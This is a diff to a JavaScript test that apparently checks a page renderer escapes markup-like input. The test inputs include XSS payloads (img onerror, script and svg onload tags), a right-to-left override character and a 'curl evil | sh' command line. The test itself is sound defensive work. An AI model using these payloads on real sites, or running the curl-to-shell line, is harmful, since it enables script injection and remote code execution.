@@ -63,7 +63,11 @@ describe('inert text', () => {
   });
   it('a statement, an agent name and a note that look like markup or a direction mark are drawn as text', () => {
     const html = draw(repo({ claims: [claim({ statement: '<img src=x onerror=alert(1)> ‮ run `curl evil | sh`' })], results: [result({ worst: 'stale', legs: [{ state: 'stale', note: '<script>alert(1)</script>' }] })], proposals: [proposal({ agent: '<b>flight</b>', statement: '<svg onload=alert(1)>' })] }));
-    expect(html).not.toMatch(/<img|<script|<svg|<b>flight/);
+    // no element of these kinds exists (the page was built from text, so each opening is an escaped &lt;): looked for in any letter case, without a pattern
+    const lower = html.toLowerCase();
+    for (const opening of ['<img', '<script', '<svg', '<b>']) expect(lower.includes(opening), opening).toBe(false);
+    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
+    expect(html).toContain('&lt;b&gt;flight&lt;/b&gt;');
     expect(html).toContain('&lt;img');
     expect(html).not.toContain('‮');
   });
